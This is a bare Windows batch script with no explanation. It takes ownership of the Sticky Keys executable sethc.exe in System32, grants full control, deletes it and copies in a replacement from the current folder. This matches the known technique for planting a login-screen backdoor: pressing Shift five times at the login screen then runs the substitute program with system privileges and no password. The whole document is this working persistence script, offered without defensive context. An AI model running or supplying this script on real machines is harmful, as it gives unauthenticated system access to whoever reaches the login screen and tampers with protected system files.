@echo off
takeown /f C:\Windows\System32\sethc.exe /a
icacls C:\Windows\System32\sethc.exe /grant Administrator:f
del /S C:\Windows\System32\sethc.exe
copy .\sethc.exe C:\Windows\System32\sethc.exe 
pause&&exit

